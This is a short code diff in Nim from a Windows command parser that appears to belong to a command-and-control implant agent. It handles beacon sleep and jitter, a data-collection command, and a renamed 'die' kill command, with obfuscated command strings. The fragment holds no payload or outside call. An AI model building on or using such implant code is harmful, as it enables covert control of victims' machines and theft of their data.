@@ -735,8 +735,8 @@ proc windows_parse_command*(command: JsonNode): bool =
             is_success = change_sleep_time(client, command[protectString("timeframe")].getInt(), command[protectString("jitter_percent")].getInt())
         of protectString("collect"):
             is_success = collect_data()
-        of protectString("kill"):
-            kill_agent(client)
+        of protectString("die"):
+            die(client)
 
         else:
             is_success = false
